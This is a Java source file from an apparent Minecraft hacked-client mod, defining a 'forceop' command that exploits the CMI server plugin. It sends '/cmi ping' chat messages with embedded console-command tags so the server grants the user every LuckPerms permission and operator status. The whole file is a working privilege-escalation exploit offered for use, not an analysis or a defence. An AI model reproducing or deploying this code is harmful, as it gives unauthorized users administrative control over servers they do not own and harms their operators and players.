package tk.milkthedev.paradiseclientfabric.command.impl;

import net.minecraft.client.MinecraftClient;
import tk.milkthedev.paradiseclientfabric.Helper;
import tk.milkthedev.paradiseclientfabric.command.Command;
import tk.milkthedev.paradiseclientfabric.command.CommandInfo;
import tk.milkthedev.paradiseclientfabric.command.exception.CommandException;

import java.util.Objects;

@CommandInfo(
        alias = "forceop",
        description = "Gives you op thru CMI exploit",
        usage = "forceop"
)
public class ForceOPCommand extends Command
{

    @Override
    public boolean execute(String commandAlias, String... args) throws CommandException
    {
        Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler()).sendChatCommand("/cmi ping <T>Click here</T><CC>lp user " + MinecraftClient.getInstance().getSession().getUsername() +  " p set * true</CC>");
        Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler()).sendChatCommand("/cmi ping <T>Click here</T><CC>op" + MinecraftClient.getInstance().getSession().getUsername() +  "</CC>");
        return true;
    }

    @Override
    public String[] onTabComplete(String commandAlias, String... args)
    {
        return new String[0];
    }
}
